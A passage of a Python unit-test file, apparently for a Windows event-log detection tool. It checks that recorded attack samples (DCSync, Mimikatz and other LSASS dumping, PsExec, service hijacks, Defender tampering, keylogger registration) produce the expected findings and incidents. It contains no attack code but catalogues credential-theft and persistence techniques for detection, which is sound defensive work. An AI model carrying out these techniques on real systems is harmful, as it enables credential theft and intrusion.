        shutil.copy2(PSEXEC_NATIVE_SYSTEM_SAMPLE, temp_dir / PSEXEC_NATIVE_SYSTEM_SAMPLE.name)
        findings = self._run_dataset(temp_dir, "test-attack-sample-psexec-sequence")
        finding = next((item for item in findings["findings"] if item.get("title") == "PsExec Remote Execution Sequence"), None)
        self.assertIsNotNone(finding)

    @unittest.skipUnless(DCSYNC_SAMPLE.is_file(), "DCSync EVTX sample not available")
    def test_attack_sample_dcsync_generates_finding_and_incident(self):
        findings = self._run_dataset(DCSYNC_SAMPLE, "test-attack-sample-dcsync")
        finding = next((item for item in findings["findings"] if item.get("title") == "DCSync Directory Replication"), None)
        self.assertIsNotNone(finding)
        self.assertGreaterEqual(findings["summary"]["incident_count"], 1)

    @unittest.skipUnless(LOCAL_ADMIN_SAMPLE.is_file(), "local admin manipulation EVTX sample not available")
    def test_attack_sample_local_admin_group_addition_still_generates_finding(self):
        findings = self._run_dataset(LOCAL_ADMIN_SAMPLE, "test-attack-sample-local-admin")
        finding = next((item for item in findings["findings"] if item.get("title") == "Member Added to Sensitive Group"), None)
        self.assertIsNotNone(finding)

    @unittest.skipUnless(GUEST_ADMINS_SAMPLE.is_file(), "guest added to admins EVTX sample not available")
    def test_attack_sample_guest_added_to_admins_resolves_member_identity(self):
        findings = self._run_dataset(GUEST_ADMINS_SAMPLE, "test-attack-sample-guest-admins")
        members = [item.get("evidence", {}).get("member") for item in findings["findings"] if item.get("title") == "Member Added to Sensitive Group"]
        self.assertIn("Guest", members)
        self.assertIn(r"NT AUTHORITY\NETWORK SERVICE", members)

    @unittest.skipUnless(Path(ROOT / "sample_cache" / "evtx_guest_rid_hijack.evtx").is_file(), "guest RID hijack EVTX sample not available")
    def test_attack_sample_guest_rid_hijack_generates_finding(self):
        findings = self._run_dataset(ROOT / "sample_cache" / "evtx_guest_rid_hijack.evtx", "test-attack-sample-guest-rid-hijack")
        finding = next((item for item in findings["findings"] if item.get("title") == "Guest RID Hijack"), None)
        self.assertIsNotNone(finding)

    @unittest.skipUnless(NEW_USER_SAMPLE.is_file(), "new user EVTX sample not available")
    def test_attack_sample_new_user_and_group_addition_generates_specific_finding(self):
        findings = self._run_dataset(NEW_USER_SAMPLE, "test-attack-sample-new-user")
        finding = next((item for item in findings["findings"] if item.get("title") == "New Privileged Account Provisioned"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "new_privileged_account_provisioning"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertIn("Administrators", finding["evidence"].get("sensitive_groups", []))

    @unittest.skipUnless(QUICK_LOCAL_GROUP_CHURN_SAMPLE.is_file(), "rapid local group churn EVTX sample not available")
    def test_attack_sample_quick_local_group_churn_generates_finding(self):
        findings = self._run_dataset(QUICK_LOCAL_GROUP_CHURN_SAMPLE, "test-attack-sample-local-group-churn")
        finding = next((item for item in findings["findings"] if item.get("title") == "Rapid Local Group Membership Churn"), None)
        self.assertIsNotNone(finding)

    @unittest.skipUnless(Path(ROOT / "sample_cache" / "mitre_fast_user_create_delete.evtx").is_file(), "fast user create/delete EVTX sample not available")
    def test_attack_sample_fast_user_create_delete_still_generates_finding(self):
        findings = self._run_dataset(ROOT / "sample_cache" / "mitre_fast_user_create_delete.evtx", "test-attack-sample-fast-user-create-delete")
        finding = next((item for item in findings["findings"] if item.get("title") == "Rapid User Create/Delete"), None)
        self.assertIsNotNone(finding)

    @unittest.skipUnless(LOCAL_SAM_ADMIN_SAMPLE.is_file(), "local SAM/admin persistence EVTX sample not available")
    def test_attack_sample_local_sam_admin_persistence_generates_incident(self):
        findings = self._run_dataset(LOCAL_SAM_ADMIN_SAMPLE, "test-attack-sample-local-sam-admin")
        self.assertGreaterEqual(findings["summary"]["signal_count"], 2)
        self.assertEqual(findings["summary"]["finding_count"], 1)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "local_admin_account_persistence"), None)
        self.assertIsNotNone(incident)
        self.assertEqual(incident["title"], "Local administrator account persistence")
        self.assertEqual(incident["host"], "LAPTOP-JU4M3I0E")
        self.assertIn("support", incident["summary"])
        self.assertIn("sqlsvc", incident["summary"])

    @unittest.skipUnless(ATOMIC_COMPRESS_EXFIL_SAMPLE.exists(), "atomic compress/exfil sample folder not available")
    def test_attack_sample_atomic_compress_archive_generates_finding_and_incident(self):
        findings = self._run_dataset(ATOMIC_COMPRESS_EXFIL_SAMPLE, "test-attack-sample-atomic-compress-exfil")
        finding = next((item for item in findings["findings"] if item.get("title") == "PowerShell Archive Staging"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "powershell_archive_staging"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertIn(".zip", (finding.get("evidence", {}).get("archive_path") or "").lower())

    @unittest.skipUnless(ATOMIC_COR_PROFILER_SAMPLE.exists(), "atomic COR_PROFILER sample folder not available")
    def test_attack_sample_atomic_cor_profiler_generates_finding_and_incident(self):
        findings = self._run_dataset(ATOMIC_COR_PROFILER_SAMPLE, "test-attack-sample-atomic-cor-profiler")
        finding = next((item for item in findings["findings"] if item.get("title") == "COR_PROFILER System Environment Hijack"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "cor_profiler_environment_hijack"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertIn("session manager\\environment", (finding.get("evidence", {}).get("environment_scope") or "").lower())
        self.assertTrue((finding.get("evidence", {}).get("dll_path") or "").lower().endswith(".dll"))

    @unittest.skipUnless(ATOMIC_DEFENDER_TAMPER_SAMPLE.exists(), "atomic Defender tamper sample folder not available")
    def test_attack_sample_atomic_defender_tamper_generates_finding_and_incident(self):
        findings = self._run_dataset(ATOMIC_DEFENDER_TAMPER_SAMPLE, "test-attack-sample-atomic-defender-tamper")
        finding = next((item for item in findings["findings"] if item.get("title") == "Windows Defender Service Tampering"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "windows_defender_service_tampering"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertIn("windefend", json.dumps(finding.get("evidence", {})).lower())

    @unittest.skipUnless(ATOMIC_FIREWALL_RULE_SAMPLE.exists(), "atomic firewall-rule sample folder not available")
    def test_attack_sample_atomic_firewall_rule_generates_finding_and_incident(self):
        findings = self._run_dataset(ATOMIC_FIREWALL_RULE_SAMPLE, "test-attack-sample-atomic-firewall-rule")
        finding = next((item for item in findings["findings"] if item.get("title") == "Windows Firewall Rule Added"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "windows_firewall_rule_added"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual(finding.get("evidence", {}).get("local_port"), "21")

    @unittest.skipUnless(ATOMIC_RDP_SHADOW_SAMPLE.exists(), "atomic RDP shadowing sample folder not available")
    def test_attack_sample_atomic_rdp_shadowing_generates_finding_and_incident(self):
        findings = self._run_dataset(ATOMIC_RDP_SHADOW_SAMPLE, "test-attack-sample-atomic-rdp-shadow")
        finding = next((item for item in findings["findings"] if item.get("title") == "RDP Shadowing Enabled"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "rdp_shadowing_enabled"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual(finding.get("evidence", {}).get("shadow_value"), 2)

    @unittest.skipUnless(ATOMIC_SERVICE_IMAGEPATH_SAMPLE.exists(), "atomic service ImagePath sample folder not available")
    def test_attack_sample_atomic_service_imagepath_generates_finding_and_incident(self):
        findings = self._run_dataset(ATOMIC_SERVICE_IMAGEPATH_SAMPLE, "test-attack-sample-atomic-service-imagepath")
        finding = next((item for item in findings["findings"] if item.get("title") == "Service ImagePath Registry Hijack"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "service_imagepath_registry_hijack"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertIn("cmd.exe", (finding.get("evidence", {}).get("image_path") or "").lower())

    @unittest.skipUnless(ATOMIC_SIP_HIJACK_SAMPLE.exists(), "atomic SIP hijack sample folder not available")
    def test_attack_sample_atomic_sip_hijack_generates_finding_and_incident(self):
        findings = self._run_dataset(ATOMIC_SIP_HIJACK_SAMPLE, "test-attack-sample-atomic-sip-hijack")
        finding = next((item for item in findings["findings"] if item.get("title") == "SIP Trust Provider Registration"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "sip_trust_provider_registration"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertIn("gtsipprovider", json.dumps(finding.get("evidence", {})).lower())


    @unittest.skipUnless(LSASS_AUDIT_SAMPLE.is_file(), "security-audited LSASS sample not available")
    def test_attack_sample_security_audit_lsass_access_generates_finding_and_incident(self):
        findings = self._run_dataset(LSASS_AUDIT_SAMPLE, "test-attack-sample-lsass-audit")
        finding = next((item for item in findings["findings"] if item.get("title") == "Security Audit LSASS Access"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "security_audit_lsass_access"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(POWERSHELL_WER_LSASS_SAMPLE.is_file(), "PowerShell WER LSASS sample not available")
    def test_attack_sample_powershell_wer_lsass_dump_generates_finding_and_incident(self):
        findings = self._run_dataset(POWERSHELL_WER_LSASS_SAMPLE, "test-attack-sample-ps-wer-lsass")
        finding = next((item for item in findings["findings"] if item.get("title") == "PowerShell WER LSASS Dump"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "powershell_wer_lsass_dump"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(MEMSSP_LOG_SAMPLE.is_file(), "MemSSP log sample not available")
    def test_attack_sample_memssp_log_generates_finding_and_incident(self):
        findings = self._run_dataset(MEMSSP_LOG_SAMPLE, "test-attack-sample-memssp-log")
        finding = next((item for item in findings["findings"] if item.get("title") == "MemSSP Credential Log File"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "memssp_credential_logging"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(RDRLEAKDIAG_SAMPLE.is_file(), "RdrLeakDiag LSASS sample not available")
    def test_attack_sample_rdrleakdiag_lsass_dump_generates_finding_and_incident(self):
        findings = self._run_dataset(RDRLEAKDIAG_SAMPLE, "test-attack-sample-rdrleakdiag")
        finding = next((item for item in findings["findings"] if item.get("title") == "LSASS Dump via RdrLeakDiag"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "lsass_dump_via_rdrleakdiag"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(SEKURLSA_SAMPLE.is_file(), "Mimikatz sekurlsa sample not available")
    def test_attack_sample_mimikatz_lsass_access_generates_finding_and_incident(self):
        findings = self._run_dataset(SEKURLSA_SAMPLE, "test-attack-sample-mimikatz-lsass")
        finding = next((item for item in findings["findings"] if item.get("title") == "Mimikatz LSASS Access"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "mimikatz_lsass_access"), None)
        signal = next((item for item in findings["signals"] if item.get("source_rule") == "LSASS Memory Access"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertIsNotNone(signal)
        self.assertNotIn("LSASS Memory Access", {item.get("title") for item in findings["findings"]})

    @unittest.skipUnless(COMSVCS_LSASS_SAMPLE.is_file(), "comsvcs LSASS dump sample not available")
    def test_attack_sample_comsvcs_lsass_dump_generates_specific_incident(self):
        findings = self._run_dataset(COMSVCS_LSASS_SAMPLE, "test-attack-sample-comsvcs-lsass")
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "lsass_dump_via_comsvcs"), None)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(TASKMGR_FILE_SAMPLE.is_file(), "Task Manager LSASS dump file sample not available")
    def test_attack_sample_taskmgr_lsass_dump_file_generates_finding_and_incident(self):
        findings = self._run_dataset(TASKMGR_FILE_SAMPLE, "test-attack-sample-taskmgr-file")
        finding = next((item for item in findings["findings"] if item.get("title") == "Task Manager LSASS Dump"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "task_manager_lsass_dump"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(TASKMGR_AUDIT_SAMPLE.is_file(), "Task Manager LSASS audit sample not available")
    def test_attack_sample_taskmgr_lsass_audit_generates_finding_and_incident(self):
        findings = self._run_dataset(TASKMGR_AUDIT_SAMPLE, "test-attack-sample-taskmgr-audit")
        finding = next((item for item in findings["findings"] if item.get("title") == "Task Manager LSASS Dump"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "task_manager_lsass_dump"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(PPLDUMP_SAMPLE.is_file(), "PPLdump sample not available")
    def test_attack_sample_ppldump_generates_incident(self):
        findings = self._run_dataset(PPLDUMP_SAMPLE, "test-attack-sample-ppldump")
        incident_types = {item.get("incident_type") for item in findings["incidents"]}
        self.assertIn("ppldump_lsass_dump", incident_types)

    @unittest.skipUnless(PROCDUMP_SAMPLE.is_file(), "Procdump sample not available")
    def test_attack_sample_procdump_generates_incident(self):
        findings = self._run_dataset(PROCDUMP_SAMPLE, "test-attack-sample-procdump")
        incident_types = {item.get("incident_type") for item in findings["incidents"]}
        self.assertTrue({"procdump_lsass_dump", "task_manager_lsass_dump", "lsass_memory_dump_activity"} & incident_types)

    @unittest.skipUnless(DUMPERT_SAMPLE.is_file(), "Dumpert sample not available")
    def test_attack_sample_dumpert_generates_incident(self):
        findings = self._run_dataset(DUMPERT_SAMPLE, "test-attack-sample-dumpert")
        incident_types = {item.get("incident_type") for item in findings["incidents"]}
        self.assertTrue({"custom_lsass_dump_tool", "lsass_memory_dump_activity", "lsass_memory_access"} & incident_types)

    @unittest.skipUnless(INSTALLUTIL_SAMPLE.is_file(), "InstallUtil sample not available")
    def test_attack_sample_installutil_generates_finding_and_incident(self):
        findings = self._run_dataset(INSTALLUTIL_SAMPLE, "test-attack-sample-installutil")
        finding = next((item for item in findings["findings"] if item.get("title") == "InstallUtil Proxy Execution"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "installutil_proxy_execution"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(DESKTOPIMGDOWNLDR_SAMPLE.is_file(), "desktopimgdownldr sample not available")
    def test_attack_sample_desktopimgdownldr_generates_finding_and_incident(self):
        findings = self._run_dataset(DESKTOPIMGDOWNLDR_SAMPLE, "test-attack-sample-desktopimgdownldr")
        finding = next((item for item in findings["findings"] if item.get("title") == "DesktopImgDownldr Remote Download"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "desktopimgdownldr_remote_download"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(DSRM_4794_SAMPLE.is_file(), "DSRM 4794 sample not available")
    def test_attack_sample_standalone_dsrm_change_generates_finding_and_incident(self):
        findings = self._run_dataset(DSRM_4794_SAMPLE, "test-attack-sample-dsrm-4794")
        finding = next((item for item in findings["findings"] if item.get("title") == "DSRM Password Changed"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "dsrm_password_changed"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(DSRM_NTDSUTIL_SAMPLE.is_file(), "DSRM ntdsutil sample not available")
    def test_attack_sample_dsrm_ntdsutil_generates_specific_finding_not_dcsync(self):
        findings = self._run_dataset(DSRM_NTDSUTIL_SAMPLE, "test-attack-sample-dsrm-ntdsutil")
        titles = {item.get("title") for item in findings["findings"]}
        incident_types = {item.get("incident_type") for item in findings["incidents"]}
        self.assertIn("DSRM Password Changed", titles)
        self.assertIn("dsrm_password_changed", incident_types)
        self.assertNotIn("DCSync / NTDS Dump", titles)

    @unittest.skipUnless(PASSWORD_POLICY_ENUM_SAMPLE.is_file(), "Password policy enumeration sample not available")
    def test_attack_sample_password_policy_enumeration_generates_finding(self):
        findings = self._run_dataset(PASSWORD_POLICY_ENUM_SAMPLE, "test-attack-sample-password-policy")
        finding = next((item for item in findings["findings"] if item.get("title") == "Password Policy Enumeration"), None)
        self.assertIsNotNone(finding)

    @unittest.skipUnless(WDIGEST_SAMPLE.is_file(), "WDigest sample not available")
    def test_attack_sample_wdigest_generates_finding_and_incident(self):
        findings = self._run_dataset(WDIGEST_SAMPLE, "test-attack-sample-wdigest")
        finding = next((item for item in findings["findings"] if item.get("title") == "WDigest Logon Credential Storage Enabled"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "wdigest_credential_storage_enabled"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(VAULT_ACCESS_SAMPLE.is_file(), "vault access sample not available")
    def test_attack_sample_vault_access_generates_finding_and_incident(self):
        findings = self._run_dataset(VAULT_ACCESS_SAMPLE, "test-attack-sample-vault-access")
        finding = next((item for item in findings["findings"] if item.get("title") == "Windows Credential Manager Access"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "credential_manager_access"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(PHISH_CREDENTIAL_PROMPT_SAMPLE.is_file(), "phish credential prompt sample not available")
    def test_attack_sample_powershell_credential_prompt_generates_findings_and_incident(self):
        findings = self._run_dataset(PHISH_CREDENTIAL_PROMPT_SAMPLE, "test-attack-sample-phish-credential-prompt")
        titles = {item.get("title") for item in findings["findings"]}
        incident = next(
            (item for item in findings["incidents"] if item.get("incident_type") == "powershell_credential_prompt_harvesting"),
            None,
        )

        self.assertIn("PowerShell Encoded Payload", titles)
        self.assertIn("PowerShell Credential Prompt Harvesting", titles)
        self.assertIsNotNone(incident)

        prompt_finding = next(
            (item for item in findings["findings"] if item.get("title") == "PowerShell Credential Prompt Harvesting"),
            None,
        )
        self.assertIsNotNone(prompt_finding)
        self.assertEqual(prompt_finding.get("evidence", {}).get("prompt_title"), "Windows Security")
        self.assertTrue(prompt_finding.get("evidence", {}).get("password_extraction"))

    @unittest.skipUnless(REMOTE_SERVICE_7045_SAMPLE.is_file(), "remote service 7045 sample not available")
    def test_attack_sample_remote_service_7045_groups_duplicate_incidents(self):
        findings = self._run_dataset(REMOTE_SERVICE_7045_SAMPLE, "test-attack-sample-remote-service-7045")
        finding_titles = {item.get("title") for item in findings["findings"]}
        incident_titles = [item.get("title") for item in findings["incidents"]]
        incident_types = {item.get("incident_type") for item in findings["incidents"]}

        self.assertIn("Service Installed", finding_titles)
        self.assertIn("Suspicious Service Execution", finding_titles)
        self.assertIn("correlated_attack_chain", incident_types)
        self.assertIn("service_installation_abuse", incident_types)
        self.assertIn("suspicious_service_execution", incident_types)
        self.assertEqual(findings["summary"]["incident_count"], 3)
        self.assertEqual(incident_titles.count("Service installed"), 1)
        self.assertEqual(incident_titles.count("Suspicious service execution"), 1)

    @unittest.skipUnless(ACL_FORCEPWD_SPNADD_SAMPLE.is_file(), "ACL force password / SPN add sample not available")
    def test_attack_sample_acl_forcepwd_spnadd_groups_policy_modification_incidents(self):
        findings = self._run_dataset(ACL_FORCEPWD_SPNADD_SAMPLE, "test-attack-sample-acl-forcepwd-spnadd")
        titles = {item.get("title") for item in findings["findings"]}
        policy_incidents = [item for item in findings["incidents"] if item.get("incident_type") == "policy_modification"]

        self.assertIn("Group Policy Object Modified", titles)
        self.assertEqual(len(policy_incidents), 1)
        self.assertEqual(findings["summary"]["incident_count"], 2)
        self.assertGreaterEqual(len(policy_incidents[0].get("finding_ids", [])), 2)

    @unittest.skipUnless(SILENT_PROCESS_EXIT_LSASS_SAMPLE.is_file(), "SilentProcessExit lsass sample not available")
    def test_attack_sample_silent_process_exit_lsass_generates_finding_and_incident(self):
        findings = self._run_dataset(SILENT_PROCESS_EXIT_LSASS_SAMPLE, "test-attack-sample-silent-process-exit-lsass")
        finding = next((item for item in findings["findings"] if item.get("title") == "LSASS Dump via SilentProcessExit"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "silent_process_exit_lsass_dump"), None)

        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual(
            finding.get("evidence", {}).get("monitor_process"),
            r"C:\Users\IEUser\Desktop\LsassSilentProcessExit.exe",
        )

    @unittest.skipUnless(NTDSUTIL_APPLOG_SAMPLE.is_file(), "NTDSUtil application-log sample not available")
    def test_attack_sample_ntds_snapshot_export_generates_finding_and_incident(self):
        findings = self._run_dataset(NTDSUTIL_APPLOG_SAMPLE, "test-attack-sample-ntds-snapshot-export")
        finding = next((item for item in findings["findings"] if item.get("title") == "NTDS.dit Snapshot Export"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "ntds_snapshot_export"), None)

        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertIn(
            r"C:\$SNAP_201911270054_VOLUMEC$\Windows\NTDS\ntds.dit",
            (finding.get("evidence", {}) or {}).get("source_paths", []),
        )
        self.assertEqual(
            (finding.get("evidence", {}) or {}).get("export_path"),
            r"C:\Users\bob\Desktop\test\Folder\ntds\Active Directory\ntds.dit",
        )

    @unittest.skipUnless(METERPRETER_HASHDUMP_SAMPLE.is_file(), "meterpreter hashdump sample not available")
    def test_attack_sample_meterpreter_hashdump_generates_finding_and_incident(self):
        findings = self._run_dataset(METERPRETER_HASHDUMP_SAMPLE, "test-attack-sample-meterpreter-hashdump")
        finding = next((item for item in findings["findings"] if item.get("title") == "LSASS Remote Thread Injection"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "lsass_remote_thread_injection"), None)

        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual(
            (finding.get("evidence", {}) or {}).get("source_image"),
            r"\\VBOXSVR\HTools\voice_mail.msg.exe",
        )
        self.assertIn("0x1f1fff", (finding.get("evidence", {}) or {}).get("access_masks", []))

    @unittest.skipUnless(DIRECTINPUT_KEYLOGGER_SAMPLE.is_file(), "DirectInput keylogger sample not available")
    def test_attack_sample_directinput_keylogger_generates_finding_and_incident(self):
        findings = self._run_dataset(DIRECTINPUT_KEYLOGGER_SAMPLE, "test-attack-sample-directinput-keylogger")
        finding = next((item for item in findings["findings"] if item.get("title") == "DirectInput Keylogger Registration"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "directinput_keylogger_registration"), None)

        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual(
            (finding.get("evidence", {}) or {}).get("process_path"),
            r"C:\Users\IEUser\Desktop\keylogger_directx.exe",
        )
        self.assertTrue(
            {"name", "id", "version"}.issubset(set((finding.get("evidence", {}) or {}).get("registry_keys_modified", [])))
        )

    @unittest.skipUnless(PASSWORD_POLICY_CMD_SAMPLE.is_file(), "password policy command sample not available")
    def test_attack_sample_password_policy_commandline_generates_finding(self):
        findings = self._run_dataset(PASSWORD_POLICY_CMD_SAMPLE, "test-attack-sample-password-policy-cmd")
        titles = {item.get("title") for item in findings["findings"]}
        self.assertIn("Command-Line Password Policy Discovery", titles)

    @unittest.skipUnless(SERVICE_FAILURE_COMMAND_SAMPLE.is_file(), "service failure command sample not available")
    def test_attack_sample_service_failure_command_generates_finding_and_incident(self):
        findings = self._run_dataset(SERVICE_FAILURE_COMMAND_SAMPLE, "test-attack-sample-service-failure-command")
        titles = {item.get("title") for item in findings["findings"]}
        incident_types = {item.get("incident_type") for item in findings["incidents"]}
        self.assertIn("Service Failure Command Abuse", titles)
        self.assertIn("service_failure_command_abuse", incident_types)

    @unittest.skipUnless(SERVICE_FAILURE_COMMAND_POWERSHELL_SAMPLE.is_file(), "service failure PowerShell sample not available")
    def test_attack_sample_service_failure_command_powershell_generates_finding_and_incident(self):
        findings = self._run_dataset(SERVICE_FAILURE_COMMAND_POWERSHELL_SAMPLE, "test-attack-sample-service-failure-command-powershell")
        titles = {item.get("title") for item in findings["findings"]}
        incident_types = {item.get("incident_type") for item in findings["incidents"]}
        self.assertIn("Service Failure Command Abuse", titles)
        self.assertIn("service_failure_command_abuse", incident_types)

    @unittest.skipUnless(SERVICE_MALICIOUS_PATH_SAMPLE.is_file(), "service malicious path sample not available")
    def test_attack_sample_service_imagepath_command_generates_finding_and_incident(self):
        findings = self._run_dataset(SERVICE_MALICIOUS_PATH_SAMPLE, "test-attack-sample-service-imagepath-command")
        titles = {item.get("title") for item in findings["findings"]}
        incident_types = {item.get("incident_type") for item in findings["incidents"]}
        self.assertIn("Service ImagePath Command Abuse", titles)
        self.assertIn("service_imagepath_command_abuse", incident_types)

    @unittest.skipUnless(SERVICE_MALICIOUS_PATH_POWERSHELL_SAMPLE.is_file(), "service malicious path PowerShell sample not available")
    def test_attack_sample_service_imagepath_command_powershell_generates_finding_and_incident(self):
        findings = self._run_dataset(SERVICE_MALICIOUS_PATH_POWERSHELL_SAMPLE, "test-attack-sample-service-imagepath-command-powershell")
        titles = {item.get("title") for item in findings["findings"]}
        incident_types = {item.get("incident_type") for item in findings["incidents"]}
        self.assertIn("Service ImagePath Command Abuse", titles)
        self.assertIn("service_imagepath_command_abuse", incident_types)

    @unittest.skipUnless(SERVICE_CREATE_COMMAND_SAMPLE.is_file(), "service create command sample not available")
    def test_attack_sample_service_create_command_generates_finding_and_incident(self):
        findings = self._run_dataset(SERVICE_CREATE_COMMAND_SAMPLE, "test-attack-sample-service-create-command")
        titles = {item.get("title") for item in findings["findings"]}
        incident_types = {item.get("incident_type") for item in findings["incidents"]}
        self.assertIn("Service Creation Command", titles)
        self.assertIn("service_creation_command", incident_types)

    @unittest.skipUnless(REMOTE_SERVICE_CREATE_COMMAND_SAMPLE.is_file(), "remote service create command sample not available")
    def test_attack_sample_remote_service_create_command_generates_finding_and_incident(self):
        findings = self._run_dataset(REMOTE_SERVICE_CREATE_COMMAND_SAMPLE, "test-attack-sample-remote-service-create-command")
        titles = {item.get("title") for item in findings["findings"]}
        incident_types = {item.get("incident_type") for item in findings["incidents"]}
        self.assertIn("Remote Service Creation Command", titles)
        self.assertIn("remote_service_creation_command", incident_types)

    @unittest.skipUnless(OPENSSH_INSTALL_SAMPLE.is_file(), "OpenSSH install sample not available")
    def test_attack_sample_openssh_install_generates_finding_and_incident(self):
        findings = self._run_dataset(OPENSSH_INSTALL_SAMPLE, "test-attack-sample-openssh-install")
        finding = next((item for item in findings["findings"] if item.get("title") == "OpenSSH Server Installed"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "openssh_server_installed"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertIn("openssh.server", (finding.get("evidence", {}).get("capability_name") or "").lower())
        self.assertIn("offsec\\admmig", (finding.get("user") or "").lower())

    @unittest.skipUnless(OPENSSH_ENABLE_SAMPLE.is_file(), "OpenSSH enablement sample not available")
    def test_attack_sample_openssh_enablement_generates_finding_and_incident(self):
        findings = self._run_dataset(OPENSSH_ENABLE_SAMPLE, "test-attack-sample-openssh-enable")
        finding = next((item for item in findings["findings"] if item.get("title") == "OpenSSH Server Enabled"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "openssh_server_enabled"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual((finding.get("service") or "").lower(), "sshd")
        self.assertEqual((finding.get("evidence", {}).get("startup_type") or "").lower(), "automatic")
        self.assertIn("offsec\\admmig", (finding.get("user") or "").lower())

    @unittest.skipUnless(OPENSSH_LISTEN_SAMPLE.is_file(), "OpenSSH listening sample not available")
    def test_attack_sample_openssh_listening_generates_finding_and_incident(self):
        findings = self._run_dataset(OPENSSH_LISTEN_SAMPLE, "test-attack-sample-openssh-listen")
        finding = next((item for item in findings["findings"] if item.get("title") == "OpenSSH Server Listening"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "openssh_server_listening"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual((finding.get("evidence", {}).get("listening_port") or ""), "22")
        self.assertIn("0.0.0.0", json.dumps(finding.get("evidence", {})))

    @unittest.skipUnless(USER_DISCOVERY_SAMPLE.is_file(), "user discovery sample not available")
    def test_attack_sample_user_discovery_generates_finding(self):
        findings = self._run_dataset(USER_DISCOVERY_SAMPLE, "test-attack-sample-user-discovery")
        titles = {item.get("title") for item in findings["findings"]}
        self.assertIn("User Account Discovery", titles)

    @unittest.skipUnless(GROUP_DISCOVERY_SAMPLE.is_file(), "group discovery sample not available")
    def test_attack_sample_group_discovery_generates_finding(self):
        findings = self._run_dataset(GROUP_DISCOVERY_SAMPLE, "test-attack-sample-group-discovery")
        titles = {item.get("title") for item in findings["findings"]}
        self.assertIn("Group Discovery", titles)

    @unittest.skipUnless(NETWORK_SHARE_DISCOVERY_SAMPLE.is_file(), "network share discovery sample not available")
    def test_attack_sample_network_share_discovery_generates_finding(self):
        findings = self._run_dataset(NETWORK_SHARE_DISCOVERY_SAMPLE, "test-attack-sample-network-share-discovery")
        titles = {item.get("title") for item in findings["findings"]}
        self.assertIn("Network Share Discovery", titles)

    @unittest.skipUnless(DOMAIN_TRUST_DISCOVERY_SAMPLE.is_file(), "domain trust discovery sample not available")
    def test_attack_sample_domain_trust_discovery_generates_finding(self):
        findings = self._run_dataset(DOMAIN_TRUST_DISCOVERY_SAMPLE, "test-attack-sample-domain-trust-discovery")
        titles = {item.get("title") for item in findings["findings"]}
        self.assertIn("Domain Trust Discovery", titles)

    @unittest.skipUnless(SPN_DISCOVERY_SAMPLE.is_file(), "SPN discovery sample not available")
    def test_attack_sample_spn_discovery_generates_finding(self):
